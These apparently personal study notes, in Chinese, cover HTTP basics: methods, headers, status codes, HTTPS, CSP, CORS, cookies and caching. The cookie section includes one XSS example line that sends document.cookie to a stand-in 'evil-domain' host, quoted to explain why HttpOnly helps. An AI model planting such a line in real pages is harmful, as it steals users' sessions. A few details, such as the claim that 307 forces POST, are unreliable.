---
title: Http
comments: true
date: 2019-01-26 22:52:14
categories: Http
tags: ['Http']
---

# HTTP
> HTTP Hyper Text Transfer Protocol（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。

> HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。

> HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型。支持客户/服务器模式, 只能客户端发起请求，服务器回送响应; 简单快速：客户向服务器请求服务时，只需传送请求方法和路径, 通信速度很快; 灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记; 无连接, 限制每次连接只处理一个请求, 服务器处理完客户的请求，并收到客户的应答后，即断开连接; 无状态, HTTP是一个无状态的协议，服务器不会在两个请求之间保留任何数据（状态）。而使用HTTP的头部扩展，HTTP Cookies就可以解决这个问题。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。注意，HTTP本质是无状态的，使用Cookies可以创建有状态的会话。

> HTTP协议通常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。默认HTTP的端口号为80，HTTPS的端口号为443。

### 工作流程
一次HTTP操作称为一个事务，其工作过程可分为四步：客户机与服务器需要建立连接；客户机发送请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容；服务器响应请求；客户端显示信息，断开连接。

### 三次握手
浏览器向服务器发出连接请求 SYN，seq:X （x=0）；
服务器回应了浏览器的请求，并要求确认 SYN，ACK，此时seq：y（y为0），ACK：x+1（为1）；
浏览器回应了服务器的确认，连接成功 ACK，此时seq：x+1（为1），ACK：y+1（为1）。

### 浏览器输入URL后http请求返回的完整过程
Redirect -> App cache应用缓存 -> DNS 解析（域名对应ip地址）-> 创建TCP连接 (三次握手) -> Request发送请求 -> Response接收响应

### OSI（Open System Interconnect），即开放式系统互联七层模型（一个理想的模型）：
* 物理层Physical Layer： 比特流的传输。实际最终信号的传输是通过物理层实现的,通过物理介质传输比特流, 规定了电平、速度和电缆针脚。常用各种物理设备,集线器、中继器、调制解调器、网线、双绞线、同轴电缆。相当于快递寄送过程中的交通工具，如汽车，火车，飞机，船。
* 数据链路层Data Link La  yer: 介质访问接入。负责建立和管理节点间的链路。通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。分为介质访问控制（MAC）和逻辑链路控制（LLC）两个子层。如网桥、以太交换机、网卡。
* 网络层Network Layer，即IP协议层：路由寻址。通过路由选择算法，为报文或分组通过通信子网选择最适当的路径，控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。寻址、交换、 路由算法、连接服务。如路由器。相当于快递公司庞大的快递网络，全国不同的集散中心
* 传输层Transport Layer：端到端的连接。向用户提供可靠的端到端的差错和流量控制，负责传输连接管理、处理传输差错和监控服务质量，保证报文的正确传输，向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。OSI下3层的主要任务是数据通信(通信子网的功能)，上3层的任务是数据处理(资源子网的功能)。常见的协议：TCP、UDP协议、Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议. 该层是通信子网和资源子网的接口和桥梁，起到承上启下的作用。相当于投递员。
* 会话层Session Layer：主机间的通信。组织和协调两个会话进程之间的通信，并对数据交换进行管理。相当于公司的外联部。
* 表示层Presentation Layer：数据的表示。对来自应用层的命令和数据进行解释，对各种语法赋予相应的含义，如编码、数据格式转换和加解密等，并按照一定的格式传送给会话层。相当于公司文秘翻译。
* 应用层Application Layer：处理网络应用。提供应用接口，也为用户直接提供各种网络服务。常见应用层的网络服务协议有HTTP，HTTPS，FTP，POP3、SMTP等。
对等通信，为了使数据分组从源传送到目的地，源端OSI模型的每一层都必须与目的端的对等层进行通信，这种通信方式称为对等层通信。在每一层通信过程中，使用本层自己协议进行通信。

### TCP/IP五层模型
* 物理层、数据链路层、网络层、传输层、应用层(对应OSI的会话层、表示层和应用层)

### HTTP1.1版本新特性
默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求；管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应；断点续传原理

### http2与http1.1区别
信道复用； server push ; 所有数据二进制传输； 同一连接里面发送多个请求不再需要按照顺序； 头信息压缩以及分帧传输

### GET方法与POST方法的区别
1、get重点在从服务器上获取资源，post重点在向服务器发送数据；2、get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用"?"连接，多个请求数据间用"&"连接，这个过程用户是可见的；post将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；3、Get传输的数据量小，因为受URL长度限制，但效率较高；Post可以传输大量数据，所以上传文件时只能用Post方式；4、get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；post较get安全性较高；5、get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。post支持标准字符集，可以正确传递中文字符。

### 常用的HTTP方法有哪些？
* GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器。
* POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。
* PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。
* HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。
* DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。
* OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求, 查询相应URI支持的HTTP方法。
* TRACE: 请求服务器回送收到的请求信息，主要用于测试或诊断
* CONNECT: 保留将来使用

### http请求由三部分组成，分别是：请求行、消息报头、请求正文
请求报文包含三部分：
a、请求行(起始行start-line）：包含请求方法、URI、HTTP版本信息。 GET /test/hi.txt HTTP/1.0
b、请求首部字段 Headers
c、请求内容主体 Body

响应报文包含三部分：
a、状态行(status line)：包含HTTP版本、状态码、状态码的原因短语. HTTP/1.0 200 OK
b、响应首部字段 Headers
c、响应内容主体 Body

HTTP/2 帧： HTTP/2 引入了一个额外的步骤：它将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 多路复用 (multiplexing) 的过程，它允许更有效的底层 TCP 连接。

### 常见HTTP首部字段
a、通用首部字段（请求报文与响应报文都会使用的首部字段）
* Date：创建报文时间
* Connection：连接的管理
* Cache-Control：缓存指令, 缓存指令是单向、独立的,响应中出现的缓存指令在请求中未必会出现,一个消息的缓存指令不会影响另一个消息处理的缓存机制。
请求时的缓存指令包括：no-cache（用于指示请求或响应消息不能缓存）、no-store、max-age、max-stale、min-fresh、only-if-cached;
响应时的缓存指令包括：public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age、s-maxage.
* Transfer-Encoding：报文主体的传输编码方式
b、请求首部字段（请求报文会使用的首部字段）
* Host：请求资源所在服务器
* Accept：可处理的媒体类型
* Accept-Charset：可接收的字符集
* Accept-Encoding：可接受的内容编码
* Accept-Language：可接受的自然语言
c、响应首部字段（响应报文会使用的首部字段）
* Accept-Ranges：可接受的字节范围
* Location：令客户端重新定向到的URI
* Server：HTTP服务器的安装信息
d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）
* Allow：资源可支持的HTTP方法
* Content-Type：实体主类的类型
* Content-Encoding：实体主体适用的编码方式
* Content-Language：实体主体的自然语言
* Content-Length：实体主体的的字节数
* Content-Range：实体主体的位置范围，一般用于发出部分请求时使用
* X-Content-Type-Options: nosiff  禁用客户端的 MIME 类型嗅探行为
* X-Frame-OptionsEdit: DENY(表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许) / SAMEORIGIN(表示该页面可以在相同域名页iframe 中展示) / ALLOW-FROM uri (表示该页面可以在指定来源的 frame 中展示)
* X-XSS-Protection: 0 (禁止XSS过滤) / 1; mode=block (当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面)

### 协议升级机制
HTTP协议 提供了一种特殊的机制，这一机制允许将一个已建立的连接升级成新的、不相容的协议。需要添加两项额外的header：
Connection: Upgrade， 设置 Connection 头的值为 "Upgrade" 来指示这是一个升级请求.
Upgrade: protocols， Upgrade 头指定一项或多项协议名，按优先级排序，以逗号分隔。

### 常见的HTTP相应状态码
返回的状态
* 1xx：Informational 指示信息--表示请求已接收，继续处理
* 2xx：Success 成功--表示请求已被成功接收、理解、接受
* 3xx：Redirection 重定向--信息不完整，要进行更进一步的补充
* 4xx：Client Error 客户端错误--请求有语法错误或请求无法实现
* 5xx：Server Error 服务器端错误--服务器未能实现合法的请求

* 100 Continue 继续, 客户端必须继续发出请求
* 101 Switching Protocols 交换协议, 客户端要求服务器根据请求转换HTTP协议版本
* 102 Processing 处理

* 200 OK, 请求被正常处理
* 201 Created 创建, 请求成功并且服务器创建了新的资源
* 202 Accepted 已接受, 但尚未处理
* 203 Non-Authoritative Information 非授权信息, 服务器已成功处理了请求，但返回的信息可能来自另一来源
* 204 No Content 无内容,  请求收到，但返回信息为空
* 205 Reset Content 重置内容, 服务器完成了请求，重置文档视图(例如，清除表单内容以输入新内容)
* 206 Partial Content 部分内容, 服务器已经完成了部分用户的GET请求
* 207 Multi-Status 多状态
* 208 Already Reported 已报告
* 226 IMIM Used 使用的

* 300 Multiple Choices 多种选择, 请求的资源可在多处得到
* 301 Moved Permanently , 永久性重定向, 在Location响应首部的值仍为当前URL(隐式重定向)。使用301要慎重，一旦使用，服务端更改路由设置，用户如果不清理浏览器缓存，就会一直重定向。
* 302 Found, 临时重定向, 在Location响应首部的值仍为新的URL(显示重定向)。每次请求仍然需要经过服务端指定跳转地址
* 303 See Other ,建议客户端访问其他URL或访问方式,能通过GET方法重定向到另一个URI上
* 304 Not Modified, 请求的资源没有改变 可以继续使用缓存
* 305 Use Proxy 使用代理
* 306 Switch Proxy 开关代理, 前一版本HTTP中使用的代码，现行版本中不再使用
* 307 Temporary Redirect , 临时重定向，与302类似，只是强制要求使用POST方法
* 308 Permanent Redirect 永久重定向

* 400 Bad Request 错误的请求, 服务器不理解请求的语法; 网站服务未启动
* 401 Unauthorized 未授权, 请求要求身份验证。对于需要登录的网页，服务器可能返回此响应
* 402 Payment Required 需要付费
* 403 Forbidden 服务器拒绝访问
* 404 Not Found 服务器找不到请求的网页
* 405 Method Not Allowed 不允许的方法
* 406 Not Acceptable 不可接受
* 407 Proxy Authentication Required 代理服务器需要身份验证, 与 401（未授权）类似，但指定请求者应当授权使用代理
* 408 Request Timeout 请求超时
* 409 Conflict 冲突, 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。
* 410 Gone 已删除, 如果请求的资源已永久删除，服务器就会返回此响应
* 411 Length Required 需要长度, 服务器不接受不含有效内容长度标头字段的请求
* 412 Precondition Failed 前提条件失败, 服务器未满足请求者在请求中设置的其中一个前提条件
* 413 Payload Too Large 负载过大
* 414 URI Too Long 太长
* 415 Unsupported Media Type 不支持的媒体类型, 请求的格式不受请求页面的支持
* 416 Range Not Satisfiable 的范围不合适, 如果页面无法提供请求的范围，则服务器会返回此状态代码
* 417 Expectation Failed 预期失败, 服务器未满足"期望"请求标头字段的要求
* 418 I'm a teapot 我是一个茶壶
* 421 Misdirected Request 误导请求
* 422 Unprocessable Entity 无法处理的实体
* 423 Locked 锁定
* 424 Failed Dependency 失败的依赖
* 426 Upgrade Required 升级所需
* 428 Precondition Required 所需的先决条件
* 429 Too Many Requests 太多的请求
* 431 Request Header Fields Too Large 请求头字段太大
* 451 Unavailable For Legal Reasons 不可出于法律原因
* 499 网络繁忙，同一个ip过来的过多请求直接中断

* 500 Internal Server Error 内部服务器错误
* 501 Not Implemented 未执行, 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码
* 502 Bad Gateway 错误的网关, 服务器作为网关或代理，从上游服务器收到无效响应。
* 503 Service Unavailable 服务不可用, 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。
* 504 Gateway Timeout 网关超时, 服务器作为网关或代理，但是没有及时从上游服务器收到请求
* 505 HTTP Version Not Supported 不支持HTTP版本
* 506 Variant Also Negotiates 变体也进行协商
* 507 Insufficient Storage 存储空间不足
* 508 Loop Detected 检测到循环
* 510 Not Extended 不延长
* 511 Network Authentication Required 网络需要身份验证


### URI、URL和URN
* URI：Uniform Resource Identifier，即统一资源标志符，用来唯一的标识一个资源。
* URL：Uniform Resource Locator，统一资源定位符, 也叫Web地址。即URL可以用来标识一个资源，而且还指明了如何locate这个资源。
* URN：Uniform Resource Name，统一资源命名。即通过名字来表示资源的。
格式： http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument. 
protocol方案或协议(http://) + domain name主机(www.example.com) + port端口(:80) + path路径(/path/to/myfile.html) + parameters查询(?key1=value1&key2=value2) + anchor片段(#SomewhereInTheDocument)

### HTTP的缺点与HTTPS
a、通信使用明文不加密，内容可能被窃听；
b、不验证通信方身份，可能遭到伪装；
c、无法验证报文完整性，可能被篡改。
HTTPS就是HTTP加上加密处理（一般是SSL安全通信线路）+认证+完整性保护

### HTTP优化
利用负载均衡优化和加速HTTP应用；利用HTTP Cache来优化网站

### curl 利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具
curl [option] [url]
如 curl -v baidu.com
```
* Rebuilt URL to: www.baidu.com/
*   Trying 61.135.169.125...
* TCP_NODELAY set
* Connected to www.baidu.com (61.135.169.125) port 80 (#0)
> GET / HTTP/1.1
> Host: www.baidu.com
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
< Connection: Keep-Alive
< Content-Length: 2381
< Content-Type: text/html
< Date: Mon, 26 Nov 2018 13:59:17 GMT
< Etag: "588604c4-94d"
< Last-Modified: Mon, 23 Jan 2017 13:27:32 GMT
< Pragma: no-cache
< Server: bfe/1.0.8.18
< Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/
<
```


### HTTPS
> HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。
> HTTPS协议的主要作用可以分为两种：确认网站的真实性；建立一个信息安全通道，来保证数据传输的安全。
> 区别主要如下：1、https协议需要ca申请证书，需要费用。 2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。3、完全不同的连接方式和端口，http是80，https是443。　4、http的连接很简单，无状态；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。
> 缺点: 1、HTTPS协议握手阶段比较费时，会使页面的加载时间延长近50%，增加10%到20%的耗电；2、HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗，甚至已有的安全措施也会因此而受到影响；3、SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用。4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。5、HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。





### MIME
> 多用途Internet邮件扩展（MIME）类型 是一种标准化的方式来表示文档的性质和格式。浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理文档。
> 通用结构: type/subtype, 大小写不敏感，但是传统写法都是小写
* text/plain	文本文件默认值
* text/html	HTML内容
* text/css	CSS文件
* image/webp	图像
* audio/ogg	音频文件
* video/webm	视频文件
* video/webm	视频文件
* application/octet-stream 二进制数据	
* application/javascript  JavaScript文件或JSONP format
* application/msword  文档类型Microsoft Word		扩展名.doc
* application/vnd.ms-excel   文档类型Microsoft Excel	扩展名.xls	
* application/vnd.openxmlformats-officedocument.spreadsheetml.sheet   文档类型Microsoft Excel (OpenXML)	  扩展名.xlsx	
* multipart/form-data   Multipart 类型

MIME 嗅探, 在缺失 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行MIME嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 MIME 类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 Content-Type 来设置 X-Content-Type-Options: nosniff 以阻止MIME嗅探。假如请求类型为以下两种，那么阻止请求的发生："style" 但是 MIME 类型不是 "text/css"，"script" 但是 MIME 类型不是JavaScript MIME 类型。



### CSP  Content-Security-Policy 内容安全策略
> 作用:限制资源获取,报告资源获取越权，减少和报告跨站脚本XSS攻击。CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)；数据包嗅探攻击, 除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如 (从理想化的安全角度来说)，服务器可指定所有内容必须通过HTTPS加载。

> 限制方式: default-src限制全局;  制定资源类型 connect-src、img-src、font-src、media-src、frame-src、script-src、manifest-src、style-src

> 一个策略由一系列策略指令所组成，每个策略指令都描述了一个针对某个特定类型资源以及生效范围的策略。你的策略应当包含一个default-src策略指令，在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看default-src )。一个策略可以包含 default-src  或者 script-src 指令来防止内联脚本运行, 并杜绝eval()的使用。 一个策略也可包含一个 default-src 或  style-src 指令去限制来自一个 style 元素或者style属性的內联样式.

* Content-Security-Policy: default-src 'self': 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)
* Content-Security-Policy: default-src 'self' *.trusted.com: 允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)
* Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com: 允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.

> 对策略进行测试, 为降低部署成本，CSP可以部署为报告(report-only)模式。在此模式下，CSP策略不是强制性的，但是任何违规行为将会报告给一个指定的URI地址。Content-Security-Policy-Report-Only: policy

> 启用违例报告, 默认情况下，违规报告并不会发送。为启用发送违规报告，你需要指定 report-uri 策略指令，并提供至少一个URI地址去递交报告：Content-Security-Policy: default-src 'self'; report-uri http://reportcollector.example.com/collector.cgi



###  CORS
> 当一个资源从与该资源本身所在的服务器不同的域或端口请求一个资源时，资源会发起一个跨域 HTTP 请求
> cross-origin sharing standard 跨域资源共享标准， 跨域限制以及预请求验证
> 简单请求,不需要预请求 : 方法 GET HEAD POST; Content-Type:  text/plain、 multipart/form-data、 application/x-www-form-urlencoded; 首部字段集合为Accept 、Accept-Language、Content-Language、Content-Type （需要注意额外的限制）、DPR、Downlink、Save-Data、Viewport-Width、Width。请求中的XMLHttpRequestUpload 对象未注册任意多个事件监听器； 请求中未使用ReadableStream对象。
> 预检请求:必须首先使用OPTIONS方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。"预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。
> 附带身份凭证的请求:Fetch 与 CORS 可以基于  HTTP cookies 和 HTTP 认证信息发送身份凭证。对于跨域 XMLHttpRequest 或 Fetch 请求，如果要发送凭证信息，需要设置XMLHttpRequest 的 withCredentials为true，从而向服务器发送 Cookies。同时，服务器端的响应中携带 Access-Control-Allow-Credentials: true 。此时，服务器不得设置 Access-Control-Allow-Origin 的值为*。
> HTTP 请求首部字段,这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪: Origin, 表明预检请求或实际请求的源站 URI, 它不包含任何路径信息，只是服务器名称; Access-Control-Request-Method; Access-Control-Request-Headers;
> HTTP 响应首部字段: Access-Control-Allow-Origin; Access-Control-Expose-Headers; Access-Control-Max-Age; Access-Control-Allow-Credentials; Access-Control-Allow-Methods; Access-Control-Allow-Headers。



### Cookie,  Web Cookie或浏览器Cookie
* 服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。
* 用途：会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）;个性化设置（如用户自定义设置、主题等）;浏览器行为跟踪.
* 分类：会话期Cookie和持久性Cookie。会话期Cookie关闭浏览器会自动删除失效 ；持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age。提示：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。
response.setHeader('Set-Cookie', ['name=sea; max-age=2', 'year=2018; Expires=Wed, 21 Oct 2015 07:28:00 GMT;HttpOnly; domain=test.com']);
* 标记:  Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端 ;HttpOnly, 为避免跨域脚本 (XSS) 攻击, document.cookie无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端.
* Cookie的作用域: Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名；Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中），以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
* SameSite Cookies： 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。
* 会话劫持和XSS： 在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie。 HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。
* 跨站请求伪造（CSRF）: 对用户输入进行过滤来阻止XSS；任何敏感操作都需要确认；用于敏感信息的Cookie只能拥有较短的生命周期。 


### Cache-Control 缓存， 缓解服务器端压力，提升性能
> Cache-Control: private 私有缓存, public 公共缓存, no-cache 强制确认缓存, no-store 禁止进行缓存, must-revalidate 缓存验证确认, max-age=31536000 缓存（保持新鲜）的最大时间




### 数据协商
客户端发送请求给服务端，客户端会声明请求希望拿到的数据的格式和限制，服务端会根据请求头信息，来决定返回的数据。

> 请求 Accept 
* Accept 声明想要数据的类型;  accept: */*
* Accept-Encoding 数据编码方式，限制服务端如何进行数据压缩; accept-encoding: gzip, deflate, br。 gzip使用最多；br使用比较少但压缩比高。
* Accept-Language 展示语言;  accept-language: zh-CN,zh;q=0.9,en;q=0.8。 浏览器会判断系统的语言自动加上。q代表权重，数值越大权重越大，优先级越高。
* User-Agent 浏览器相关信息。 user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36。 

### Accept
> 服务端返回Content  
* Content-Type 对应 Accept，从 Accept 中选择数据类型返回;  
* Content-Encoding 对应 Accept-Encoding，声明服务端数据压缩的方式;  
```
const zlib = require('zlib') // 引入包

const html = fs.readFileSync('test.html') // 这里不加 utf8，加了返回的就是字符串格式了

response.writeHead(200, {
    'Content-Type': 'text/html',
    'Content-Encoding': 'gzip'
})

response.end(zlib.gzipSync(html)) 
```
* Content-Language 对应 Accept-Language，是否根据请求返回语言。





### HTTP长连接 Connection
> HTTP 的请求是在 TCP 连接的基础上发送的，而 TCP链接分为长连接和短连接 。插件控制台network，name那一行，右键选中 connection ID，代表tcp连接的 id。
> 短连接：若关闭 TCP 连接，下次请求需要重新创建，这时会有网络延迟的开销，好处是每次请求完关闭 TCP 连接，减少客户端和服务端连接的并发数。
> 长连接：HTTP 发送请求时，要先创建一个 TCP 连接，并在 TCP 连接上把 HTTP 请求的内容发送并且接收完返回，这是一次请求完成，浏览器与服务器进行协商是否关闭 TCP 链接，若不关闭 TCP 连接会有一定的消耗，好处是如果还有请求可以直接在这个 TCP 连接上发送，不需要经过创建时三次握手的消耗。
> 默认开启长连接，都是合理利用 Connection:‘keep-alive’，并设置一个自动关闭时间，在服务端进行控制通过设置 ‘Connection’: 'close' 来关闭默认的长连接.
> HTTP 2 信道复用, 在 TCP 连接上可以并发的发送 HTTP 请求，意味着链接网站是只需要一个 TCP 连接。google.com的页面都是用的 HTTP2。它的 connection id 都是一个，注意，同域 id 才相同，不同域需要创建 tcp 连接，这样降低了开销，速度有质的提升。
